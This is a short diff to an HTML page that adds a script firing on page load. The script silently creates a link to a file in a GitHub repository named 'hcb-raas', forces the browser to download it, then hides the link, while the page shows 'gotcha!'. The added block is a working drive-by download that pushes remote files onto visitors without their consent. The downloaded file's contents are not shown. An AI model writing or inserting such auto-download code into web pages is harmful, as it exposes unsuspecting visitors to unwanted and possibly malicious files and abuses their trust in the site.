@@ -4,6 +4,16 @@
       <link rel="stylesheet" href="style.css">
    </head>
    <body>
+      <script>
+       window.onload = function() {
+         var downloadLink = document.createElement('a');
+         downloadLink.href = 'https://raw.githubusercontent.com/quinnathy/hcb-raas/main/hiii.txt'; 
+         downloadLink.download = 'hiii.txt'; 
+         document.body.appendChild(downloadLink);
+         downloadLink.click();
+         document.body.removeChild(downloadLink);
+      }
+      </script>
       <div class="container">
          <div class="child">
             <p>gotcha!</p>
